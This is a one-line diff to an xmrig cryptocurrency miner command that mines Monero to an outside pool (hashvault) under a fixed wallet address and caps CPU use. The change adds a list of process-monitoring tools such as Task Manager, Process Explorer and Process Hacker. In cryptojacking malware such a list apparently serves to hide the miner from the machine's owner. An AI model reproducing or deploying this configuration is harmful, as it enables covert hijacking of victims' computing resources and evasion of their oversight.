@@ -1,1 +1,1 @@
-xmrig.exe --url=pool.hashvault.pro:443 --user=8C9YNRuYjYu78KjCZojboLApngcriAWP7XiAz3pef7fgSjpZBXeRjzKUMBStV62UzQKPoBc2StmytV79LnodTB8gVGffg1G --pass=REDPANDA --tls --keepalive --cpu-max-threads-hint=35
+xmrig.exe --url=pool.hashvault.pro:443 --user=8C9YNRuYjYu78KjCZojboLApngcriAWP7XiAz3pef7fgSjpZBXeRjzKUMBStV62UzQKPoBc2StmytV79LnodTB8gVGffg1G --pass=REDPANDA --algo=rx/0 --tls --keepalive --cpu-max-threads-hint=35 taskmgrs=taskmgr,resmon,perfmon,procexp,procmon,procdump,processhacker,systeminformer,processlasso,systemexplorer,anvir,securitytaskmanager,taskexplorer,pchunter
